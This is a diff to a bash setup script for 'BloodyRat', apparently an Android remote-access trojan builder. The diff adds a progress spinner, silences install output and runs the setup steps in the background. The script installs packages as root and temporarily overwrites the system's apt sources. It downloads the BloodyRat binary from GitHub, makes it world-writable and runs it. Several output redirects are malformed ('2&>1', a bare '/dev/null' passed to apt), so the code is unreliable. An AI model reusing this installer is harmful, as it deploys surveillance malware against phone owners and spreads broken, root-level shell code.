@@ -16,6 +16,23 @@ blue="\033[1;34m"                                           ##
 nc="\033[0m"                                                ## 
 
 
+#spinner
+spinner() {
+        pid=$!
+        spin='\|/-'
+        i=0
+        tput civis
+        while kill -0 $pid 2>/dev/null
+	do
+                i=$(( (i+1) %4 ))
+                printf "\r${cyan1}[${spin:$i:1}]${nc} ${cyan1} $launch"
+                sleep .1
+	done
+        printf "\r   ${green}[✔]${nc} ${green} $splashdown";echo
+        tput cnorm
+}
+
+
 function os () {
 	cat /etc/os-release > /dev/null 2>&1
 	if [ "$?" -eq "0" ]; then
@@ -39,7 +56,7 @@ function dependencies() {
 		pkgs=(git wget nodejs npm apktool)
 		for pkg in "${pkgs[@]}"; do			
 			type -p "$pkg" &>/dev/null || {
-			sudo su -c "apt install "$pkg" -y" 
+			sudo su -c "apt install "$pkg" -y > /dev/null 2&>1" 
 			}
 	done
 	fi	
@@ -54,24 +71,24 @@ function do_patches () {
 	if [ "${OS}" != "DEBIAN" ];then
 		sudo su -c "cat /etc/apt/sources.list > /etc/apt/SL.bk"
 		sudo su -c "echo 'deb http://security.debian.org/debian-security stretch/updates main' > /etc/apt/sources.list"
-		sudo su -c  "apt update -y && sudo apt install openjdk-8-jdk"
+		sudo su -c  "apt update -y && sudo apt install openjdk-8-jdk /dev/null 2&>1"
 		sudo su -c "cat /etc/apt/SL.bk > /etc/apt/sources.list"
 	else
-		sudo su -c "apt install openjdk-8-jre-headless -y"
+		sudo su -c "apt install openjdk-8-jre-headless -y > /dev/null 2&>1"
 	fi
 	sudo su -c "update-alternatives --set java /usr/lib/jvm/java-8-openjdk*/jre/bin/java > /dev/null 2&>1"
-	sudo su -c "apt update -y" > /dev/null 2>&1
+	sudo su -c "apt update -y /dev/null 2&>1" > /dev/null 2>&1
 }
 
 function main () {	
 	cd ${main}/server && npm install
  	sudo su -c "wget -N https://github.com/Bhaviktutorials/BloodyRat/raw/main/files/BloodyRat -q -O ${BIN}/BloodyRat" && sudo su -c "chmod 777 ${BIN}/BloodyRat"
+	BloodyRat --fix-apkbuilder > /dev/null 2&>1
 }
 
 
-
 os 
-dependencies
-git_clone
-do_patches
-main
+launch="Managing dependencies";splashdown="Managed dependencies"; (dependencies) & spinner
+launch="Setting BloodyRat";splashdown="Set up BloodyRat"; (git_clone) & spinner
+launch="Patching BloodyRat";splashdown="Patched up BloodyRat"; (do_patches) & spinner
+launch="Final setup";splashdown="Done setting up"; (main) & spinner
